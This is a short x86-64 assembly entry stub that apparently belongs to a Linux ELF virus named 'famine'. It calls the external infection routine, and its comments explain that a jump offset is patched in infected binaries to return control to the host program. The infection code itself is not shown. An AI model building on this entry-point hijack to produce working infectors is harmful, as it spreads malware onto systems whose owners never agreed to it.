bits 64

section .text
	global	_start
	extern	famine

_start:
	push	rax
	push	rbx
	push	rcx
	push	rdx

	call	famine	

	pop		rdx
	pop		rcx
	pop		rbx
	pop		rax
	jmp	0x4		; Does nothing but is the "lunch-pad" to the real entrypoint.
				; The "0x4" value will be changed on infected binaries to 
				; jump back to the program execution	
	mov	rax, 60
	mov	rdi, 0
	syscall		; exit(0)

section .note.GNU-stack noalloc noexec nowrite progbits
